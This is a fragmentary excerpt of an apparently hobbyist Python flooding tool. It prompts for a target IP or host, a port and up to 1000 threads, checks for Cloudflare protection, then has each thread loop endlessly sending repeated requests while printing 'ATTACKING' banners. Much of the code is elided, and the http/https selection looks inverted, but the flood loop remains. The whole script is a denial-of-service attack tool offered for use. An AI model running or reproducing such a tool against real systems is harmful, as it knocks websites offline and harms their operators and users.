...
parser = argparse.ArgumentParser(description="MOD by WACHIRA CHOOMSIRI")
...
parser.add_argument('-t', '--threads', default=800,
...
print(Fore.BLUE)
print( '''Example:
        Insert IP: 1.1.1.1 or www.example.com 
        Insert PORT(80): 80 or 1-65535
        Threads(100-1000): 800
	''')
global url
if args.ssl:
    args.host = input(' \033[1;32;40m\n Insert IP: \033[1;37;40m')
	
    url = "http://" + args.host
else:
    url = "https://" + args.host    
args.port = input(' \033[1;32;40mInsert PORT\033[1;34;40m(\033[1;31;40m80\033[1;34;40m): \033[0m')
args.threads = int(input(" \033[1;32;40mThreads\033[1;34;40m(\033[1;31;40m100\033[1;34;40m-\033[1;31;40m1000\033[1;34;40m): \033[0m"))
...
def main():
    ...
    if is_protected_by_cf():
        ...
        for x in range(args.threads):
            ...
            print (Fore.YELLOW+"THREAD-------------->| " + str(x) + " STARTED!!")
        go.set()
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print (Fore.GREEN+"<ATTACKING>----------->|", self.counter,"----------->URL------->")
                try:
                    for y in range(100):
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))  # invio
                print (Fore.GREEN+"ATTACK2 <ATTACKING>----------->|", self.counter,"----------->URL------->")
                try:
                    for y in range(100):
                        s.send(str.encode(request))
                except:
